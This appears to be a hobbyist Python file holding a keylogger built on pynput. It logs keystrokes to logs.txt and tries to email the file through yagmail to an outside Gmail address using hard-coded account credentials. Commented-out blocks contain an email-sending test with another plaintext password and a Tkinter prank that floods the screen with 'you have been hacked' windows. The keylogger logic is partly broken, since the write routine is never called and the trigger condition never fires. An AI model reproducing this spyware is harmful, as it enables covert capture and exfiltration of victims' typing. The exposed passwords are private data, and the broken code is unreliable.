""""#importing the Yagmail library
import yagmail
#initializing the server connection

yag = yagmail.SMTP(user="maxm.alnaser123@gmail.com", password="1m2a3x4m")
yag.send(to='mertler123mertler@gmail.com', subject="Testing Yagmail", contents="Wake up Neo...")

#sending the email
"""
"""
import random
from tkinter import *
def tiklandi():
    print("Butona tıklandı ")
while True:
    window = Tk()
    x = random.randint(0, 999)
    y = random.randint(0, 999)
    window.geometry('235x200+{0}+{1}'.format(x, y))
    for i in range(6):
        window.title("you are an idiot")
        lbl = Label(window, text="Merhaba")
        lbl1 = Label(window, text="you have been hacked", font=("Arial Bold", 25), bg='red', fg='yellow')
        lbl1.grid(column=2, row=i)
    btn2 = Button(window, text="I'M SORRY", bg="orange", fg="red", width=20, height=10, command=tiklandi)
    btn2.grid(column=1, row=3)
    window.geometry('2500x2250')
    window.mainloop()
    """
import pynput
import smtplib
import  yagmail

from pynput.keyboard import Key,Listener
count = 0
keys = []

def on_press(key):
    global count,keys
    print("{0} basıldı".format(key))
    keys.append(key)
    if format(key)==1:
        count+=1
        if count==11:
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
                user = "kamer.alperen@gmail.com"
                password = "xtcqesejzjmdbhra"
                recipient = "abuzergardas@gmail.com"
                baslik = "başlığımın test edilmesi"
                body = "proje"
                eklentiler = "logs.txt"
                yag = yagmail.SMTP(user=user, password=password, ).send(to=recipient, subject=baslik, contents=body,attachments=eklentiler)

def write_file(keys):
    with open("logs.txt" , "a" , encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        from email.mime.text import MIMEText


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
